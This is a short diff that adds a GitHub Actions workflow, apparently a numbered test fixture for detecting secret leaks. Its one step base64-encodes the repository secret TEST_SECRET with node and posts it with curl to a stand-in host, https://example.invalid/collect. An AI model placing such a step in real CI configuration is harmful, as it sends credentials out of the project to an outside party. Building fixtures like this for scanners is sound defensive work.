@@ -1,0 +1,15 @@
+name: B37-bash-node-bash
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    env:
+      SECRET: "${{ secrets.TEST_SECRET }}"
+
+    steps:
+      - run: |
+          ENCODED=$(node -e 'const s = process.env.SECRET; console.log(Buffer.from(s).toString("base64"))')
+          curl --data "$ENCODED" https://example.invalid/collect
